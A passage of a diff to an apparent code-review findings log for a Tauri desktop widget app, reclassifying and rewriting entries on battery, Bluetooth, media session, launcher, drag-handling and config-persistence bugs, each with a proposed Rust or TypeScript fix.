+     debounce_tx: mpsc::Sender<()>,
+ }
+@@ -282,2 +283,3 @@ impl ConfigManager {
+         let is_dirty = Arc::new(AtomicBool::new(false));
++        let persist_lock = Arc::new(tokio::sync::Mutex::new(()));
+ 
+         let (debounce_tx, mut debounce_rx) = mpsc::channel::<()>(64);
+         let write_path = config_path.clone();
+         let loop_config = current_config.clone();
+         let loop_dirty = is_dirty.clone();
++        let loop_persist = persist_lock.clone();
+ 
+         tauri::async_runtime::spawn(async move {
+@@ -310,4 +312,5 @@ impl ConfigManager {
+                         if loop_dirty.swap(false, Ordering::SeqCst) {
++                            let _guard = loop_persist.lock().await;
+                             let config_to_save = loop_config.read().await.clone();
+                             let path = write_path.clone();
+                             let _ = tokio::task::spawn_blocking(move || {
+@@ -324,2 +327,3 @@ impl ConfigManager {
+             current_config,
+             is_dirty,
++            persist_lock,
+             debounce_tx,
+@@ -369,3 +373,4 @@ impl ConfigManager {
+         self.is_dirty.store(false, Ordering::SeqCst);
++        let _guard = self.persist_lock.lock().await;
+         let path = self.config_path.clone();
+         tokio::task::spawn_blocking(move || save_config_atomic(&path, &config))
 ```
 
-### [MINOR] [OPEN] M2-10 Unhandled Error and Silent State Desync in Debounce Task Disk Save
-- **Status**: OPEN
-- **Where**: `src-tauri/src/config/storage.rs:308-314`
-- **Source**: `r-review` (2026-10-26)
+### [MAJOR] [FIXED] M2-03 Unhandled Error and Silent State Desynchronization in Debounced Disk Save
+- **Status**: FIXED
+- **Where**: `src-tauri/src/config/storage.rs:309-316`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: robustness
-- **Scenario**: In the background debounce task, when the timer fires, `loop_dirty.swap(false, Ordering::SeqCst)` clears the dirty flag BEFORE running `save_config_atomic`. If `save_config_atomic` fails (e.g. disk full, permission denied), the return value is discarded (`let _ = tokio::task::spawn_blocking(...)`), no log entry is written, and `is_dirty` remains false. The memory and disk states permanently desynchronize without notifying the app.
-- **Why**: Background debounce loop ignores `Result` from atomic save and clears dirty flag prematurely without retry on error.
+- **Scenario**: In the background debounce task, when the timer fires, `loop_dirty.swap(false, Ordering::SeqCst)` clears the dirty flag BEFORE running `save_config_atomic`. If `save_config_atomic` fails (e.g. disk full, permission denied, or transient antivirus file locking), the return value is discarded (`let _ = tokio::task::spawn_blocking(...)`), no log entry is emitted, and `is_dirty` remains false. The in-memory state and disk state permanently desynchronize without alerting the application or retrying on subsequent updates.
+- **Why**: Background debounce loop ignores the `Result` from atomic save and clears the dirty flag unconditionally before knowing whether the save succeeded.
 - **Fix**:
 ```diff
 --- a/src-tauri/src/config/storage.rs
@@ -1352,125 +453,221 @@
                          }
 ```
 
-### [MINOR] [OPEN] M3-09 `validate_launch_target` rejects standard gaming and desktop app URI schemes
+### [MAJOR] [OPEN] M3-02 WinRT Battery report query lacks COM apartment initialization
 - **Status**: OPEN
-- **Where**: `src-tauri/src/launcher/mod.rs:416-427`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/battery/mod.rs:440`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: contract
-- **Scenario**: A user configures a custom launcher item for a game or tool using its standard URI scheme (e.g. `goggalaxy://`, `battlenet://`, `ea://`, `xbox://`, `discord://`, `spotify:`). `validate_launch_target` rejects the entry because only `steam://`, `com.epicgames.launcher://`, and `http(s)://` are allowed.
-- **Why**: The URI scheme allowlist is overly strict and omits common gaming launcher protocols and popular desktop application protocols.
+- **Category**: bug [lens: F1b]
+- **Scenario**: The frontend battery widget calls synchronous command `get_battery_status`. Tauri dispatches this command on a Tokio worker threadpool thread where COM has not been initialized. `Battery::AggregateBattery()` fails immediately with `0x800401F0 (CO_E_NOTINITIALIZED)`. The error is caught by `if let Ok(telemetry) = query_winrt_battery_report()`, which fails silently and falls back to `GetSystemPowerStatus`. The widget permanently loses exact floating-point battery percentages, discharge/charge rates in milliwatts, and remaining mWh capacity data.
+- **Why**: WinRT APIs require the calling thread to enter a COM apartment via `CoInitializeEx` or `RoInitialize`. While other WinRT modules in vvidget use `ComGuard`, `battery/mod.rs` omitted COM initialization entirely.
 - **Fix**:
 ```diff
---- a/src-tauri/src/launcher/mod.rs
-+++ b/src-tauri/src/launcher/mod.rs
-@@ -421,4 +421,11 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
-         "com.epicgames.launcher:",
-+        "goggalaxy://",
-+        "battlenet://",
-+        "ea://",
-+        "xbox://",
-+        "discord://",
-+        "spotify:",
-         "https://",
-         "http://",
-     ];
+--- a/src-tauri/src/battery/mod.rs
++++ b/src-tauri/src/battery/mod.rs
+@@ -440,6 +440,7 @@ fn query_winrt_battery_report() -> Result<RawBatteryTelemetry, String> {
++    let _com_guard = crate::geo::winrt::ComGuard::new();
+     use windows::Devices::Power::Battery;
+     use windows::System::Power::BatteryStatus as WinRTBatteryStatus;
 ```
 
-### [MINOR] [OPEN] M3-10 Steam desktop shortcut icon resolution fails by matching numeric `appid` against hash filenames
+### [MAJOR] [OPEN] M3-03 Battery tracker fails to reset discharge baseline when unplugged at full charge
 - **Status**: OPEN
-- **Where**: `src-tauri/src/launcher/mod.rs:77-84,162-195`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/battery/mod.rs:109-115`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: Steam creates game icons in `<SteamRoot>/steam/games/<hash>.ico`. `find_steam_icon_url` checks if the `.ico` filename starts with the numeric `appid`. Because Steam names these files using a 40-character SHA-1 hash from the manifest's `"clienticon"` field, the comparison never matches, and games without librarycache artwork appear without icons.
-- **Why**: `parse_appmanifest_acf` only extracts `(appid, name, installdir)` and ignores the `"clienticon"` field containing the actual icon filename hash.
+- **Scenario**: A laptop rests plugged into AC power at 100% capacity (or at an 80% battery health threshold). Because charging is idle/stopped, `is_charging` is `false`. When the user unplugs the AC adapter, the power source switches to battery (`is_plugged_in` becomes `false`), but `is_charging` remains `false`. Line 110 tests `if last_charging != telemetry.is_charging`, which evaluates to `false != false` (no change). `self.samples` is NOT cleared and `smoothed_rate` is NOT reset. The tracker retains stale samples collected during AC operation, distorting drain rate calculations and time-to-empty estimates.
+- **Why**: `BatteryTracker` only tracks `last_charging_state: Option<bool>` and ignores `telemetry.is_plugged_in`. Transitioning between AC power and battery power when charging is inactive fails to trigger the state reset.
 - **Fix**:
 ```diff
---- a/src-tauri/src/launcher/mod.rs
-+++ b/src-tauri/src/launcher/mod.rs
-@@ -77,4 +77,4 @@ pub fn find_steam_icon_url(appid: &str, steam_roots: &[PathBuf]) -> Option<Str
-                             let stem = p.file_stem().and_then(|s| s.to_str()).unwrap_or("");
--                            if stem.starts_with(appid) || stem == appid {
-+                            if stem.starts_with(appid) || stem == appid || stem.len() == 40 {
-                                 if let Some(url) = file_to_data_url(&p) {
-                                     return Some(url);
+--- a/src-tauri/src/battery/mod.rs
++++ b/src-tauri/src/battery/mod.rs
+@@ -89,3 +89,3 @@ pub struct BatteryTracker {
+     pub last_sparkline_percent: Option<u8>,
+-    pub last_charging_state: Option<bool>,
++    pub last_power_state: Option<(bool, bool)>,
+ }
+@@ -108,7 +108,7 @@ impl BatteryTracker {
+-        // Reset state if charging state toggled (e.g. plugged in / unplugged)
+-        if let Some(last_charging) = self.last_charging_state {
+-            if last_charging != telemetry.is_charging {
++        // Reset state if power or charging state toggled (e.g. plugged in / unplugged)
++        if let Some((last_charging, last_plugged)) = self.last_power_state {
++            if last_charging != telemetry.is_charging || last_plugged != telemetry.is_plugged_in {
+                 self.samples.clear();
+                 self.smoothed_rate = None;
+             }
+         }
+-        self.last_charging_state = Some(telemetry.is_charging);
++        self.last_power_state = Some((telemetry.is_charging, telemetry.is_plugged_in));
 ```
 
-### [MINOR] [OPEN] M3-11 `MetricsCollector::new()` delays cold application startup by sleeping synchronously on the main thread
+### [MAJOR] [OPEN] M3-04 Bluetooth device connection returns false success without initiating connection
 - **Status**: OPEN
-- **Where**: `src-tauri/src/sysinfo/collector.rs:29` & `src-tauri/src/lib.rs:424`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/bluetooth/mod.rs:515-523`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: During cold application start, `lib.rs::run()` calls `MetricsCollector::new()` before creating windows or the tray icon. Line 29 performs a 200ms synchronous sleep (`std::thread::sleep(Duration::from_millis(200))`), adding unnecessary latency to application startup.
-- **Why**: The 200ms pause was introduced to let sysinfo calculate an initial CPU delta, but executing it synchronously during constructor creation on the main bootstrap thread blocks initialization.
+- **Category**: contract [lens: F1b]
+- **Scenario**: When the user clicks "Connect" on a paired Bluetooth device in the Bluetooth widget, the frontend invokes `toggle_bluetooth_device(device_id, true)`. `toggle_device` executes `Ok(connect)` without making any WinRT API call or initiating any connection attempt. The frontend receives `true`, displays a success notification, and toggles the UI button to "Connected", while the device physically remains disconnected.
+- **Why**: WinRT does not provide a single parameterless `ConnectAsync` method on `BluetoothDevice` without RFCOMM or GATT channel initialization. Instead of propagating an actionable error directing the user to Windows Settings, the function returns simulated success (`Ok(connect)`).
 - **Fix**:
 ```diff
---- a/src-tauri/src/sysinfo/collector.rs
-+++ b/src-tauri/src/sysinfo/collector.rs
-@@ -28,3 +28,2 @@ impl MetricsCollector {
--        // Initial 200ms sleep before first CPU sample to eliminate 0.0% artifacts
--        std::thread::sleep(Duration::from_millis(200));
-+        // Initial CPU sample without blocking startup thread
-         system.refresh_cpu_all();
+--- a/src-tauri/src/bluetooth/mod.rs
++++ b/src-tauri/src/bluetooth/mod.rs
+@@ -515,9 +515,5 @@ mod windows_impl {
+     pub fn toggle_device(_device_id: &str, connect: bool) -> Result<bool, String> {
+         let _guard = ComGuard::new();
+         if !connect {
+-            // WinRT BluetoothDevice does not support disconnecting paired devices via IClosable.
+             return Err("Bluetooth device disconnection is not supported directly via WinRT; please use Windows Settings".to_string());
+         }
+-        // WinRT does not provide a direct public ConnectAsync on BluetoothDevice without pairing or RFCOMM/GATT channel initiation.
+-        Ok(connect)
++        Err("Direct Bluetooth device connection is not supported without pairing or GATT channel initiation; please use Windows Settings".to_string())
+     }
 ```
 
-### [MINOR] [OPEN] M3-12 Sysinfo background worker runs `tauri::async_runtime::block_on` in an inner loop every 500ms
+### [MAJOR] [OPEN] M3-05 GSMTC session selector prioritizes paused Spotify over actively playing media
 - **Status**: OPEN
-- **Where**: `src-tauri/src/sysinfo/mod.rs:47`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/media/gsmtc.rs:71-95`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: The sysinfo worker runs on a dedicated OS thread. Every 500ms, it calls `tauri::async_runtime::block_on(config_manager.get_config())` to read polling rate settings. Incurring Tokio `block_on` runtime synchronization every 500ms in an infinite loop introduces unnecessary CPU overhead and context switching.
-- **Why**: `ConfigManager::get_config()` is an async method protecting an in-memory struct with a Tokio `RwLock`. The background thread only needs the polling rates, which can be cached and refreshed reactively on `config-changed`.
+- **Category**: bug
+- **Scenario**: A user keeps the Spotify desktop application running in the background while paused. The user then plays a YouTube video in Google Chrome or music in Apple Music / VLC. When `find_target_session` runs, loop 1 finds no playing Spotify session. Loop 2 ("Look for any Spotify session, e.g. paused") immediately matches the inactive Spotify session and returns it. Loop 3 (`manager.GetCurrentSession()`) and Loop 4 ("Look for any active playing session") are never evaluated. The media widget displays paused Spotify and ignores the actively playing audio.
+- **Why**: `find_target_session` placed paused Spotify sessions ahead of system-current and non-Spotify actively playing sessions in the fallback hierarchy.
 - **Fix**:
 ```diff
---- a/src-tauri/src/sysinfo/mod.rs
-+++ b/src-tauri/src/sysinfo/mod.rs
-@@ -43,4 +43,5 @@ pub fn start_metrics_worker<R: Runtime>(
-             let mut last_disk_check = std::time::Instant::now();
-+            let mut cached_config = tauri::async_runtime::block_on(config_manager.get_config());
+--- a/src-tauri/src/media/gsmtc.rs
++++ b/src-tauri/src/media/gsmtc.rs
+@@ -70,8 +70,8 @@ mod win {
+             }
  
-             loop {
--                let config = tauri::async_runtime::block_on(config_manager.get_config());
-+                let config = &cached_config;
+-            // 2. Look for any Spotify session (e.g. paused)
++            // 2. Fall back to any active playing session
+             for s in &all_sessions {
+-                if let Ok(app_id) = s.SourceAppUserModelId() {
+-                    if app_id.to_string().to_lowercase().contains("spotify") {
++                if let Ok(info) = s.GetPlaybackInfo() {
++                    if let Ok(status) = info.PlaybackStatus() {
++                        if status == GlobalSystemMediaTransportControlsSessionPlaybackStatus::Playing {
+                             return Some(s.clone());
++                        }
+                     }
+                 }
+@@ -83,9 +83,9 @@ mod win {
+             }
+ 
+-            // 4. Fall back to any active playing session
++            // 4. Fall back to any Spotify session (e.g. paused)
+             for s in &all_sessions {
+-                if let Ok(info) = s.GetPlaybackInfo() {
+-                    if let Ok(status) = info.PlaybackStatus() {
+-                        if status == GlobalSystemMediaTransportControlsSessionPlaybackStatus::Playing {
+-                            return Some(s.clone());
+-                        }
++                if let Ok(app_id) = s.SourceAppUserModelId() {
++                    if app_id.to_string().to_lowercase().contains("spotify") {
++                        return Some(s.clone());
+                     }
+                 }
 ```
 
-### [MINOR] [OPEN] M4-07 `onMouseDown` stop-propagation on `HeaderBar` toolbar fails to prevent `onPointerDown` window dragging
+### [MAJOR] [OPEN] M3-06 Media monitor event loop ignores timeline seeking and scrubbing
 - **Status**: OPEN
-- **Where**: `src/components/layout/HeaderBar.tsx:106-109`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/media/mod.rs:58-69`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: User clicks in the whitespace between buttons or on non-button action elements inside the `actions` header toolbar.
-- **Why**: `HeaderBar` has `onMouseDown={(e) => e.stopPropagation()}` on the toolbar wrapper. However, `useGridDrag` listens to `onPointerDown`, which fires prior to `onMouseDown` in the DOM event lifecycle. As a result, non-button pointerdown events bubble up to `<header {...dragHandlers}>`, triggering an accidental drag start.
+- **Scenario**: During song playback, a user scrubs the timeline in Spotify or YouTube (e.g. jumping from 0:15 to 2:45). In `start_media_monitor`, `has_changed` compares `is_active`, `is_playing`, `title`, `artist`, `album`, `track_id`, and `duration_ms`. None of these fields changed, and `position_ms` is omitted from the comparison. `has_changed` evaluates to `false`, and no `media-metadata-update` event is emitted. The frontend widget continues extrapolating time from the pre-seek timestamp, showing the wrong playback position until the track ends or pauses.
+- **Why**: Continuous position updates are intentionally omitted to avoid 500ms event spam, but discrete jumps caused by manual seeks (`abs(delta) > 3000ms`) are not detected.
 - **Fix**:
 ```diff
---- a/src/components/layout/HeaderBar.tsx
-+++ b/src/components/layout/HeaderBar.tsx
-@@ -107,3 +107,4 @@ export const HeaderBar: FC<HeaderBarProps> = ({
-       <div
-         className="flex items-center gap-1 flex-shrink-0"
-         onMouseDown={(e) => e.stopPropagation()}
-+        onPointerDown={(e) => e.stopPropagation()}
-       >
+--- a/src-tauri/src/media/mod.rs
++++ b/src-tauri/src/media/mod.rs
+@@ -58,8 +58,12 @@ pub fn start_media_monitor(app_handle: tauri::AppHandle) {
+             loop {
+                 let current = gsmtc::get_current_media_session().unwrap_or_default();
++                let pos_jump = (current.timeline.position_ms as i64 - last_session.timeline.position_ms as i64).abs() > 3000;
+                 let has_changed = current.is_active != last_session.is_active
+                     || current.is_playing != last_session.is_playing
+                     || current.title != last_session.title
+                     || current.artist != last_session.artist
+                     || current.album != last_session.album
+                     || current.track_id != last_session.track_id
++                    || pos_jump
+                     || (current.is_playing && current.timeline.duration_ms != last_session.timeline.duration_ms);
 ```
 
-### [MINOR] [OPEN] M4-08 Missing optional chaining on `config.widgets` causes uncaught `TypeError` crash during initial load
-- **Status**: OPEN
-- **Where**: `src/App.tsx:301-310` & `src/components/docking/DockContainer.tsx:85`
-- **Source**: `r-review` (2026-10-26)
+### [MAJOR] [FIXED] M3-07 `launch_app_or_uri` blocks Tokio async worker threads with synchronous `ShellExecuteW`
+- **Status**: FIXED
+- **Where**: `src-tauri/src/launcher/mod.rs:505-558`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: Application starts with uninitialized or empty configuration where `config.widgets` is null or undefined.
-- **Why**: `App.tsx` and `DockContainer.tsx` directly evaluate `config.widgets.resources?.visible`. While line 71 of `App.tsx` explicitly guards `if (!config.widgets)`, line 301 accesses `.resources` directly without optional chaining, throwing `TypeError: Cannot read properties of undefined (reading 'resources')` and crashing to the ErrorBoundary.
+- **Category**: performance [lens: F1b]
+- **Scenario**: When launching an executable or shortcut from the launcher widget, `launch_app_or_uri` executes `ShellExecuteW` directly on Tokio's async worker thread without offloading to `spawn_blocking`. If Windows SmartScreen, Windows Defender real-time scanning, or a UAC prompt intercepts the launch, `ShellExecuteW` blocks synchronously for 2 to 10 seconds, stalling the Tokio async runtime thread and delaying concurrent IPC commands.
+- **Why**: `launch_app_or_uri` is declared `async fn`, but executes blocking Win32 shell I/O directly in the async task context rather than delegating to `tokio::task::spawn_blocking`.
+- **Fix**:
+```diff
+--- a/src-tauri/src/launcher/mod.rs
++++ b/src-tauri/src/launcher/mod.rs
+@@ -505,4 +505,5 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
+     validate_launch_target(&target)?;
+ 
++    tokio::task::spawn_blocking(move || {
+     #[cfg(windows)]
+     {
+@@ -557,3 +558,5 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
+         Ok(())
+     }
++    })
++    .await
++    .map_err(|e| format!("Launch task join failed: {}", e))?
+```
+
+### [MAJOR] [OPEN] M4-01 Redundant triple event-listener registration and unthrottled IPC setPosition calls flood backend during grid drag
+- **Status**: OPEN
+- **Where**: `src/hooks/useGridDrag.ts:331`, `src/hooks/useGridDrag.ts:468`, `src/hooks/useGridDrag.ts:509-525`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: performance
+- **Scenario**: When dragging any desktop widget in independent mode, moving the pointer at high mouse report rates (125Hz-1000Hz) triggers three concurrent handlers per mouse move: `document` listener (via DOM bubbling), `window` listener, and React synthetic `onPointerMove` on `<header>`. Each handler independently calculates grid collisions and calls `appWindow.setPosition` and `update_skeleton_preview` over Tauri IPC without `requestAnimationFrame` batching, generating hundreds of redundant IPC calls and Win32 `SetWindowPos` operations per second and causing noticeable UI jitter.
+- **Why**: Listeners are attached to both `window` and `document` simultaneously, and `<header>` also attaches React `dragProps.onPointerMove`. None of the calls are batched or throttled to the monitor refresh rate.
+- **Fix**:
+```diff
+--- a/src/hooks/useGridDrag.ts
++++ b/src/hooks/useGridDrag.ts
+@@ -509,7 +509,4 @@
+     window.addEventListener("pointermove", handleWindowPointerMove);
+     window.addEventListener("pointerup", handleWindowPointerUp);
+     window.addEventListener("pointercancel", handleWindowPointerUp);
+-    window.addEventListener("mouseup", handleWindowPointerUp);
+-    document.addEventListener("pointermove", handleWindowPointerMove);
+-    document.addEventListener("pointerup", handleWindowPointerUp);
+-    document.addEventListener("mouseup", handleWindowPointerUp);
+@@ -519,7 +516,4 @@
+       window.removeEventListener("pointermove", handleWindowPointerMove);
+       window.removeEventListener("pointerup", handleWindowPointerUp);
+       window.removeEventListener("pointercancel", handleWindowPointerUp);
+-      window.removeEventListener("mouseup", handleWindowPointerUp);
+-      document.removeEventListener("pointermove", handleWindowPointerMove);
+-      document.removeEventListener("pointerup", handleWindowPointerUp);
+-      document.removeEventListener("mouseup", handleWindowPointerUp);
+```
+
+### [MAJOR] [OPEN] M4-02 Missing optional chaining on config.widgets in AppContent and DockContainer causes crash on incomplete or empty config
+- **Status**: OPEN
+- **Where**: `src/App.tsx:301-310`, `src/components/docking/DockContainer.tsx:85-114`
+- **Source**: `r-review` (2026-10-27)
+- **Confidence**: HIGH
+- **Category**: bug
+- **Scenario**: When configuration is loaded or reloaded with `config.widgets` omitted, null, or during partial configuration synchronization, rendering `AppContent` or `DockContainer` throws an unhandled `TypeError: Cannot read properties of undefined (reading 'resources')`, crashing the application UI.
+- **Why**: Both components directly access properties on `config.widgets` (e.g. `config.widgets.resources?.visible`) without optional chaining on `config.widgets`, even though adjacent lines in the same components explicitly guard with `if (!config.widgets) return []`.
 - **Fix**:
 ```diff
 --- a/src/App.tsx
 +++ b/src/App.tsx
-@@ -301,10 +301,10 @@ export const AppContent: FC = () => {
-   // 4. Main Window (Independent Preview / Multi-Widget Canvas for Web/Test environment)
+@@ -301,10 +301,10 @@
 -  const isResourcesVisible = config.widgets.resources?.visible ?? true;
 -  const isSpotifyVisible = config.widgets.spotify?.visible ?? true;
 -  const isWeatherVisible = config.widgets.weather?.visible ?? true;
@@ -1491,134 +688,50 @@
 +  const isBatteryVisible = config.widgets?.battery?.visible ?? false;
 +  const isCalendarVisible = config.widgets?.calendar?.visible ?? false;
 +  const isClockVisible = config.widgets?.clock?.visible ?? false;
+--- a/src/components/docking/DockContainer.tsx
++++ b/src/components/docking/DockContainer.tsx
+@@ -85,15 +85,15 @@
+-    if (config.widgets.resources?.visible ?? true) {
++    if (config.widgets?.resources?.visible ?? true) {
+...
+-    if (config.widgets.spotify?.visible ?? true) {
++    if (config.widgets?.spotify?.visible ?? true) {
+...
+-    if (config.widgets.weather?.visible ?? true) {
++    if (config.widgets?.weather?.visible ?? true) {
 ```
 
-### [MINOR] [OPEN] M4-09 Incomplete `.theme-light` tokens for status indicators fail WCAG contrast requirements
+### [MAJOR] [OPEN] M4-03 Multi-monitor bounding coordinate calculation corrupts virtual desktop boundaries when displays have different DPI scaling
 - **Status**: OPEN
-- **Where**: `src/styles/fluent.css:35-53`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: User switches to light mode. Widgets render status badges or progress bars (e.g. warning or success states).
-- **Why**: `.theme-light` fails to define `--fluent-success`, `--fluent-warning`, and `--fluent-error`. Light theme inherits dark-mode pastel shades (e.g. `--fluent-warning: #fce100`), which have near-zero contrast against light acrylic surfaces (`rgba(243, 243, 243, 0.72)`), making status text and icons unreadable and failing WCAG 2.1 AA.
-- **Fix**:
-```diff
---- a/src/styles/fluent.css
-+++ b/src/styles/fluent.css
-@@ -52,2 +52,7 @@
-   --fluent-control-bg: rgba(0, 0, 0, 0.04);
-   --fluent-control-active: rgba(0, 0, 0, 0.08);
-+
-+  /* Status Colors - Light Theme (High Contrast) */
-+  --fluent-success: #107c10;
-+  --fluent-warning: #9d5d00;
-+  --fluent-error: #c42b1c;
-```
-
-### [MINOR] [OPEN] M4-10 `Tooltip` lacks accessible `aria-describedby` association and keyboard Escape dismissal
-- **Status**: OPEN
-- **Where**: `src/components/ui/Tooltip.tsx:22-31, 58-79`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: contract
-- **Scenario**: Keyboard-only or screen reader user navigates action buttons in `HeaderBar` or `DockContainer`.
-- **Why**: `Tooltip` renders a detached `<div role="tooltip">` without an `id` or linking `aria-describedby` attribute on the trigger element. Additionally, it lacks a `keydown` listener for the `Escape` key to dismiss the tooltip without shifting focus, violating WCAG 2.1 SC 1.4.13.
-- **Fix**:
-```diff
---- a/src/components/ui/Tooltip.tsx
-+++ b/src/components/ui/Tooltip.tsx
-@@ -1,3 +1,3 @@
--import { useState, useRef, useEffect } from "react";
-+import { useState, useRef, useEffect, useId } from "react";
- import type { FC, ReactNode } from "react";
- import { cn } from "@/utils/cn";
-@@ -23,6 +23,17 @@ export const Tooltip: FC<TooltipProps> = ({
-   const timeoutRef = useRef<NodeJS.Timeout | null>(null);
-+  const tooltipId = useId();
- 
-   useEffect(() => {
-+    const handleKeyDown = (e: KeyboardEvent) => {
-+      if (e.key === "Escape" && isVisible) {
-+        hideTooltip();
-+      }
-+    };
-+    window.addEventListener("keydown", handleKeyDown);
-     return () => {
-+      window.removeEventListener("keydown", handleKeyDown);
-       if (timeoutRef.current) {
-         clearTimeout(timeoutRef.current);
-       }
-     };
--  }, []);
-+  }, [isVisible]);
-@@ -66,3 +77,4 @@ export const Tooltip: FC<TooltipProps> = ({
-       {isVisible && (
-         <div
-+          id={tooltipId}
-           role="tooltip"
-```
-
-### [MINOR] [OPEN] M4-11 `ProgressBar` ignores `labelPosition="inline"` and produces invalid CSS width on `NaN` value
-- **Status**: OPEN
-- **Where**: `src/components/ui/ProgressBar.tsx:30-31, 49`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src/hooks/useGridDrag.ts:169-174`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
-- **Scenario**: Caller passes `showLabel={true} labelPosition="inline"`, or telemetry hook passes uninitialized metric (`value={NaN}`).
-- **Why**: `ProgressBarProps` defines `labelPosition?: "inline" | "top"`, but the JSX only checks `labelPosition === "top"`, silently dropping the label for `"inline"`. When `value` is `NaN`, clamping logic propagates `NaN`, producing `style={{ width: "NaN%" }}` and `aria-valuenow={NaN}`.
+- **Scenario**: In a multi-monitor setup where Display 1 is 1920x1080 at 100% scale (x=0) and Display 2 is 2880x1620 at 150% scale placed to its right (x=1920 in virtual physical space). When computing bounding coordinates, Display 2's starting coordinate (1920) is divided by 1.5, producing `left = 1280`. This causes Display 2's bounding box to overlap Display 1 (0 to 1920) in logical coordinates and restricts `boundMaxX` to 3200 instead of 3840, preventing widgets from being dragged into the right half of the secondary monitor.
+- **Why**: Tauri monitor positions are in unified Windows virtual desktop physical coordinates. Dividing secondary monitor physical origin coordinates by their individual scale factor distorts the unified multi-monitor coordinate system.
 - **Fix**:
 ```diff
---- a/src/components/ui/ProgressBar.tsx
-+++ b/src/components/ui/ProgressBar.tsx
-@@ -30,2 +30,3 @@ export const ProgressBar = forwardRef<HTMLDivElement, ProgressBarProps>(
-   ) => {
--    const clampedValue = max <= min ? min : Math.min(Math.max(value, min), max);
-+    const safeValue = Number.isFinite(value) ? value : min;
-+    const clampedValue = max <= min ? min : Math.min(Math.max(safeValue, min), max);
-@@ -49,3 +50,3 @@ export const ProgressBar = forwardRef<HTMLDivElement, ProgressBarProps>(
--        {showLabel && labelPosition === "top" && (
-+        {showLabel && (
-           <div className="flex justify-between items-center text-xs text-[var(--fluent-text-secondary)]">
+--- a/src/hooks/useGridDrag.ts
++++ b/src/hooks/useGridDrag.ts
+@@ -169,4 +169,4 @@
+-            const left = workPos.x / mScale;
+-            const top = workPos.y / mScale;
+-            const right = left + workSize.width / mScale;
+-            const bottom = top + workSize.height / mScale;
++            const left = workPos.x / s;
++            const top = workPos.y / s;
++            const right = left + workSize.width / s;
++            const bottom = top + workSize.height / s;
 ```
 
-### [MINOR] [OPEN] M5-06 Missing volume poll interval or OS event listener leaves slider permanently out of sync
-- **Status**: OPEN
-- **Where**: `src/hooks/useMasterVolume.ts:38-73`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: User adjusts volume using keyboard hardware keys (Volume Up/Down) or Windows taskbar slider. The widget volume slider never updates and stays on the stale mount value.
-- **Why**: `useMasterVolume` invokes `refresh()` only once on initial component mount and lacks any periodic polling or native WASAPI endpoint callback.
-- **Fix**:
-```diff
---- a/src/hooks/useMasterVolume.ts
-+++ b/src/hooks/useMasterVolume.ts
-@@ -67,6 +67,10 @@ export function useMasterVolume(initialVolume = 0.5, initialMuted = false): UseM
-     if (isTauri()) {
-       void refresh();
-+      const interval = setInterval(() => {
-+        void refresh();
-+      }, 3000);
-+      return () => {
-+        isMountedRef.current = false;
-+        clearInterval(interval);
-+      };
-     }
-     return () => {
-       isMountedRef.current = false;
-     };
-```
-
----
-
-### [MINOR] [OPEN] M5-07 Hardcoded 360x384px card dimensions in BatteryWidget exceed 320x360px window registry
+### [MAJOR] [OPEN] M5-01 Hardcoded 360x384px card dimensions in BatteryWidget exceed 320x360px window registry
 - **Status**: OPEN
 - **Where**: `src/widgets/battery/BatteryWidget.tsx:79, 101, 161, 198`
-- **Source**: `r-review` (2026-10-26)
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: contract
-- **Scenario**: When BatteryWidget is mounted in standalone or preview contexts without an explicit `className` override, it renders at `w-[360px] h-[384px]`. The Tauri window is sized to `320x360px`, resulting in 40px horizontal and 24px vertical overflow clipping.
-- **Why**: Dismissed, no-battery, loading, and normal cards hardcode `w-[360px] h-[384px]` instead of `w-full h-full max-w-none`.
+- **Scenario**: When BatteryWidget is opened in a standalone desktop window, the Tauri backend creates a window sized to 320x360 (`src-tauri/src/lib.rs:71`). Because the widget container elements hardcode `w-[360px] h-[384px]`, the widget overflows the window boundaries by 40px horizontally and 24px vertically, permanently clipping off the bottom action buttons and the right margin.
+- **Why**: The root `Card` wrappers for dismissed, no-battery, loading, and normal states specify explicit pixel dimensions `w-[360px] h-[384px]` rather than responsive container bounds `w-full h-full`.
 - **Fix**:
 ```diff
 --- a/src/widgets/battery/BatteryWidget.tsx
@@ -1647,14 +760,1111 @@
 
 ---
 
-### [MINOR] [OPEN] M5-08 Bluetooth status badge displays green "Aktiv" when all paired devices are disconnected
+### [MAJOR] [OPEN] M5-02 Erroneous "Wird entladen" badge and projection failure on AC power without active charging
 - **Status**: OPEN
-- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:147, 172-179`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src/widgets/battery/BatteryWidget.tsx:290-313`, `src/types/battery.ts:87-106`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: bug
